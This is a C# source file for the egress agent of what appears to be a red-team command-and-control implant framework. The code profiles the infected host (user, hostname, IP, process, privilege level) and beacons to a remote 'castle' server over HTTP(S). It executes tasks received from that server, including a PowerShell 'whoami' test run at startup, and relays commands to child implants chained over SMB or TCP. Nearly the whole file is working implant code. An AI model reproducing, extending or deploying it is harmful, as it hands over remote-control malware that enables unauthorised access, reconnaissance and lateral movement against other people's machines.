//-------------------- Test
//#define Egress
//--------------------

#if Egress

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using Knight.Models.Comm;
using Knight.Models.Knight;
using Knight.Models.Raven;
using Knight.Utils;
using Knight.Commands;
using Knight.Helpers;

//Test
using Internal = SharedArsenal.Internal;
//

namespace Knight
{
    public sealed class Knight
    {
        private static KnightMetadata _metadata;
        private static CommModule _parentCommModule;
        private static CancellationTokenSource _tokenSource;
        private static List<KnightCommand> _commands = new List<KnightCommand>();

        private Dictionary<string, AllyCommModule> _allies = new Dictionary<string, AllyCommModule>(); // Children Soldiers

        public async Task Start(bool tls, string castleUrl, int castlePort)
        {
            WriteDebug.Good($"Started Http for {castleUrl}:{castlePort} tls:{tls}");

            //Console.Write("Press Eneter to Start Soldier: "); // DEBUG
            //Console.ReadLine();
            //Console.WriteLine("Soldier Started");

            await GenerateMetadata();
            LoadAgentCommands();

            _parentCommModule = new HttpCommModule(tls ? "https" : "http", castleUrl, castlePort);
            _parentCommModule.Init(_metadata);

            await _parentCommModule.SendCheckIn(_metadata);

            _parentCommModule.Start();    // Dont make it 'awaited' right now ... 

            _tokenSource = new CancellationTokenSource();

            //////////////////////// Mimic adding a Ally Commander
            //SMB
            //make comm
            //var dummyTaskId = Guid.NewGuid().ToString();
            //AllyCommModule commModule = isServer ? new SmbCommModule("IronHelm") : new SmbCommModule("WinDev", "IronHelm");
            //WriteDebug.Good("Created Parent Smb of Type: " + commModule.ConnectionMode.ToString());

            //// run as child connector
            //await AddChildAlly(dummyTaskId, commModule);

            // TCP
            //// make comm
            //var dummyTaskId = Guid.NewGuid().ToString();
            //AllyCommModule commModule = isServer ? new TcpCommModule(true) : new TcpCommModule("127.0.0.1");
            //WriteDebug.Good("Created Parent Tcp of Type: " + commModule.ConnectionMode.ToString());

            //// run as child connector
            //await AddChildAlly(dummyTaskId, commModule);
            //////////////////////// 

            // Test
            string a = "whoami";
            Console.WriteLine($"[*] Test for SharedArsenal on startup");
            string result = Internal.Execute.ExecuteCommand(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", a);
            Console.WriteLine($"    Running powershell {a}");
            Console.WriteLine($"    Result {result}");
            //

            while (!_tokenSource.IsCancellationRequested)
            {                
                if (_parentCommModule.RecvData(out var ravens))
                {
                    await HandleRavensFromCastle(ravens);
                }
            }
        }

        private async Task HandleRavensFromCastle(IEnumerable<Raven> ravens)
        {
            foreach (var raven in ravens)
            {
                await HandleRavenFromCastle(raven);
            }
        }

        private async Task HandleRavenFromCastle(Raven raven)
        {
            WriteDebug.Good($"HandleRavenFromParent with SoldierId: {raven.SoldierId}");

            // Check if for this Soldier
            if (!string.IsNullOrWhiteSpace(raven.SoldierId)) // Empty when raven message is HelloChild
            {
                if (!raven.SoldierId.Equals(_metadata.Id))
                {
                    foreach (var ally in _allies.Where(a => a.Value.Alive))
                    {
                        // Send ... will be sent to each child ...
                        WriteDebug.Good($"Sending Raven to Child SoldierId {ally.Key}");
                        await ally.Value.SendRaven(raven);
                    }

                    return;
                }
            }

            // Handle Raven
            switch (raven.Type)
            {
                case RavenType.CHECK_IN:
                    WriteDebug.Error($"Egress Soldier should NOT get Raven Type: {RavenType.CHECK_IN} at all");

                    // Do Nothing                    
                    break;

                case RavenType.ALLY_CHECK_IN:
                    WriteDebug.Error($"Egress Soldier should NOT get Raven Type: {RavenType.ALLY_CHECK_IN} from castle");

                    // Do Nothing
                    break;

                case RavenType.HELLO_CHILD:
                    WriteDebug.Error($"Egress Soldier should NOT get Raven Type: {RavenType.HELLO_CHILD} from castle");

                    // Do Nothing
                    break;

                case RavenType.TASK:
                    try
                    {
                        var taskMsg = Crypto.Decode<TaskMessage>(raven.Message);
                        WriteDebug.Good($"Handling Raven Type: {RavenType.TASK} & cmd: {taskMsg.Command}");

                        HandleTask(taskMsg);
                    }
                    catch (Exception ex)
                    {
                        WriteDebug.Error($"Handling Raven Type: {RavenType.TASK} & raven.Message: {raven.Message} \nError: {ex.Message}");
                    }

                    //var taskMsg = Crypto.Decode<TaskMessage>(raven.Message);
                    //WriteDebug.Good($"Handling Raven Type: {RavenType.TASK} & cmd: {taskMsg.Command}");

                    //HandleTask(taskMsg);

                    break;

                case RavenType.TASK_RESULT:
                    WriteDebug.Error($"Egress Soldier should NOT get Raven Type: {RavenType.CHECK_IN} from castle");

                    // Do Nothing
                    break;

                case RavenType.ALLY_REMOVE:
                    WriteDebug.Good($"Hadning Raven Type: {RavenType.ALLY_REMOVE}");

                    // TO DO !!!
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private static void HandleTasks(IEnumerable<TaskMessage> tasks)
        {
            foreach (TaskMessage task in tasks)
            {
                Console.WriteLine($"HandleTask with command: {task.Command}"); // DEBUG
                HandleTask(task);
            }
        }

        private static void HandleTask(TaskMessage task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));

            if (command == null)
            {
                SendTaskResult(task.TaskId, "Command not found");
                return;
            }

            try // Try Command
            {
                var result = command.Execute(task);
                SendTaskResult(task.TaskId, result);

                if (result == "exiting")    // CHANGE TO A RAVEN WITH TYPE EXIT ..................
                {
                    // Sleeping so result is sent before exiting, works but is kinda dumb
                    System.Threading.Thread.Sleep(1000 * 3);
                    _parentCommModule.Stop();
                    System.Threading.Thread.Sleep(1000 * 1);
                    _tokenSource.Cancel();
                }
            }
            catch (Exception ex) // Send back exception
            {
                Console.WriteLine(ex.ToString()); // DEBUG
                SendTaskResult(task.TaskId, ex.Message);
            }
        }

        private static void SendTaskResult(string taskid, string result)
        {
            var taskResultMsg = new TaskResultMessage
            {
                TaskId = taskid,
                Result = result,
                CompletetedAt = DateTime.UtcNow,
            };

            var raven = new Raven(_metadata.Id, RavenType.TASK_RESULT, Crypto.Encode(taskResultMsg));
            _parentCommModule.SendData(raven);
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }

        private void LoadAgentCommands() // Use Relfection to automate adding commands
        {
            var self = System.Reflection.Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes()) // each type will be a class
            {
                if (type.IsSubclassOf(typeof(KnightCommand))) // if a subclass of AgentCommand, instantiate and add to list
                {
                    var instance = (KnightCommand)Activator.CreateInstance(type);
                    instance.Init(this);

                    _commands.Add(instance);
                }
            }
        }

        private async Task GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            string hostname = Dns.GetHostName();
            IPAddress[] addresses = await Dns.GetHostAddressesAsync(hostname);
            string address = addresses.First(a => a.AddressFamily == AddressFamily.InterNetwork).ToString();
            var integrity = Integrity.MEDIUM;

            if (identity.IsSystem)
            {
                integrity = Integrity.SYSTEM;
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = Integrity.HIGH;
            }

            _metadata = new KnightMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Address = address,
                Hostname = hostname,
                Integrity = integrity,
                Username = identity.Name,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                x64 = IntPtr.Size == 8 ? true : false,
            };

            Console.WriteLine($"---------- SoldierId: {_metadata.Id} Pid: {_metadata.ProcessId}");

            process.Dispose();
            identity.Dispose();
        }

        // Add Child and start Comm (meaning this Soldier got a Task to listen/connect to a P2P Soldier)
        public async Task AddChildAlly(string taskId, AllyCommModule commModule)
        {
            //WriteDebug.Good($"Adding Child Ally with TaskId: {taskId}");
            commModule.Init();
            commModule.RavenRecieved += HandleRavenFromChild;

            // Send Ally Removal msg if comm fails
            commModule.OnException += async () =>
            {
                commModule.Stop();

                var childId = _allies.FirstOrDefault(k => k.Value == commModule).Key;

                var allyRemoveMsg = new AllyRemoveMessage(childId);
                var brokenRaven = new Raven(_metadata.Id, RavenType.ALLY_REMOVE, Crypto.Encode(allyRemoveMsg));

                _parentCommModule.SendData(brokenRaven);
            };

            // Blocks until connected
            await commModule.Start();
            WriteDebug.Good($"Started Child Ally with TaskId: {taskId}");

            // Send Hello Child
            var helloChildMsg = new HelloChildMessage(taskId, _metadata.Id,
                commModule.ConnectionMode == ConnectionMode.SERVER ? AllyDirection.FROM_CHILD : AllyDirection.TO_CHILD);
            // leave SoldierId blank
            var raven = new Raven(string.Empty, RavenType.HELLO_CHILD, Crypto.Encode(helloChildMsg));
            await commModule.SendRaven(raven);

            // Add Child, will replace taskId with childId later
            _allies.Add(taskId, commModule);
            await commModule.Run();
            WriteDebug.Good($"Running Child Ally with TaskId: {taskId}");
        }

        // Handle Raven From Child
        private async Task HandleRavenFromChild(Raven raven)
        {
            WriteDebug.Good($"HandleRavenFromChild with SoldierId: {raven.SoldierId}");

            // If child is checking In, might be our direct child
            if (raven.Type == RavenType.ALLY_CHECK_IN)
            {
                var allyCheckInMsg = Crypto.Decode<AllyCheckInMessage>(raven.Message);

                // Check if we are parent
                if (allyCheckInMsg.ParentId.Equals(_metadata.Id))
                {
                    // Update child in dict
                    if (_allies.TryGetValue(allyCheckInMsg.TaskId, out var commModule))
                    {
                        _allies.Remove(allyCheckInMsg.TaskId);
                        _allies.Add(allyCheckInMsg.Metadata.Id, commModule);
                        //_allies.Add(raven.SoldierId, commModule); // same thing


                        ////////////////////////////////////////// DEBUG
                        //WriteDebug.Good("### TEST ###");
                        //WriteDebug.Good("Sending test Task to Child");
                        //var task = new TaskMessage
                        //{
                        //    TaskId = Guid.NewGuid().ToString(),
                        //    Command = "whoami",
                        //    Arguments = new string[0],
                        //    File = string.Empty,
                        //};
                        //var tempRaven = new Raven(raven.SoldierId, RavenType.TASK, Crypto.Encode(task));
                        //commModule.SendRaven(tempRaven);
                        ////////////////////////////////////////// DEBUG
                    }
                }
            }

            // Forward to TeamServer
            await SendRavenHome(raven);
            //WriteDebug.Dummy("DUMMY: Sending Raven Home");
            //WriteDebug.PrintRaven(raven);
        }


        // Handle Raven Hello Child (From parent to Child so Child can CheckIn)
        private async Task HandleHelloChild(HelloChildMessage msg)
        {
            WriteDebug.Good($"HandleHelloChild with ParentId: {msg.ParentId}");

            var allyCheckInMsg = new AllyCheckInMessage(msg.TaskId, msg.ParentId, msg.Direction, _metadata);
            var raven = new Raven(_metadata.Id, RavenType.ALLY_CHECK_IN, Crypto.Encode(allyCheckInMsg));

            // Send Home
            await SendRavenHome(raven);
        }

        // Send Raven to Castle
        private async Task SendRavenHome(Raven raven)
        {
            //WriteDebug.Dummy("Sending Raven Home");
            //WriteDebug.PrintRaven(raven);

            WriteDebug.Dummy($"Sending {raven.Type} Raven Home");
            _parentCommModule.SendData(raven);
        }
    }
}

#endif